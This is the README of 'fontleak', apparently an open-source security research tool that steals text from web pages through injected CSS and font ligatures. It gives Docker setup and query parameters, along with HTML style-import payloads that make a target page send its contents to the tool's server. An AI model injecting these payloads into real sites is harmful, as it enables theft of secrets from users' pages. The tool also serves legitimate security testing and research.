[![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![GitHub release (latest by date)](https://img.shields.io/github/v/release/adrgs/fontleak)](https://github.com/adrgs/fontleak/releases)
[![GitHub stars](https://img.shields.io/github/stars/adrgs/fontleak)](https://github.com/adrgs/fontleak/stargazers)
[![Follow @adragos_](https://img.shields.io/twitter/follow/adragos_?style=social)](https://twitter.com/adragos_)
[![Chrome Headless Test](https://img.shields.io/github/actions/workflow/status/adrgs/fontleak/run-browser-tests.yml?branch=main&label=Chrome%20Headless%20Test)](https://github.com/adrgs/fontleak/actions/workflows/run-browser-tests.yml)
[![Firefox Headless Test](https://img.shields.io/github/actions/workflow/status/adrgs/fontleak/run-browser-tests.yml?branch=main&label=Firefox%20Headless%20Test)](https://github.com/adrgs/fontleak/actions/workflows/run-browser-tests.yml)

<p align="center">
  <img width="400" alt="fontleak logo" src="https://github.com/user-attachments/assets/69d9b715-e9fc-4bc6-8e0c-b4126f44434e" />
</p>

# fontleak

Fast exfiltration of text using CSS and Ligatures. Works on Chrome, Firefox and Safari and is allowed by default by DOMPurify.


https://github.com/user-attachments/assets/b30ef845-3a98-471d-87d8-032cf113306f


## Getting Started

#### Using Docker

You can quickly get started with fontleak using Docker:

```bash
# Run the container
docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest
```

Set the `BASE_URL` environment variable to the public URL where the site will be accessible.

> This will only setup a basic HTTP/1.1 server. Use a reverse proxy like Caddy for TLS and HTTP/2 or HTTP/3.


## Using fontleak

The fontleak URL accepts several parameters to customize its behavior:

#### Parameters
- `selector`: CSS selector that matches exactly one element in the target page. Default: `SELECTOR` env var or `script:first-of-type`
- `parent`: Parent element of the target element (options: `body` or `head`). Default: `PARENT` env var or `body`
- `alphabet`: Characters to include in the font. Default: `ALPHABET` env var or `string.printable` minus whitespace (except space)
- `timeout`: Timeout for @import url(). Default: `TIMEOUT` env var or `10` seconds
- `strip`: Strip unknown characters from the leak. Default: `true`
- `length`: Length of the leak. Default: `100`
- `prefix`: Prefix to remove (or to start counter from for Safari) for the dynamic leak. Default: empty string

#### Example Usage

Basic usage:
```html
<style>@import url("http://localhost:4242/");</style>
```

Custom selector, parent, and alphabet:
```html
<style>@import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");</style>
```

> **⚠️ Warning:** The CSS selector must match exactly one element in the target page. If the selector matches multiple elements or no elements, fontleak will fail to exfiltrate the text.

## Environment Variables

You can configure fontleak using these environment variables:

- `BASE_URL`: Base URL where the application is accessible (e.g., http://localhost:4242)
- `FASTAPI_LOGGING`: Enable or disable FastAPI logging. Default: "true"
- `SELECTOR`: CSS selector for target element. Default: "script:first-of-type"
- `PARENT`: Parent element (body or head). Default: "body"
- `ALPHABET`: Characters to include in the font. Default: string.printable minus whitespace
- `TIMEOUT`: Timeout for @import url(). Default: 10
- `LENGTH`: Length of the payload for static leaks. Default: 100

## Static payload

By default, fontleak will use [sequential import chaining](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b) to efficiently exfiltrate text. But it's not always the case that the target page CSP allows this. 

In this case, you can use the `/static` endpoint to generate a static CSS payload that only requires lax CSP for `img-src` and `font-src`.

```bash
wget http://localhost:4242/static -O payload.css
```

Which takes these additional parameters:
- `length`: Length of the payload. Default: `LENGTH` env var or `100`
- `browser`: The browser to target. Only Chrome and Firefox are supported for now. Default: `chrome`

Instead of unique ids, fontleak will group requests by (IP, User-Agent, Referer) pairs.

## Development

To set up a development environment:

```bash
# Clone the repository
git clone https://github.com/adrgs/fontleak.git
cd fontleak

# Install dependencies using uv
uv sync

# Install svg2ttf globally for font generation
npm install -g svg2ttf

# Run fontleak
uv run uvicorn fontleak.main:app --host 0.0.0.0 --port 4242
```

## Disclaimer

fontleak is a research project intended for educational and security testing purposes only. The author is not responsible for any misuse of this software. Users are solely responsible for ensuring they have proper authorization before using this tool in any environment. Use at your own risk.
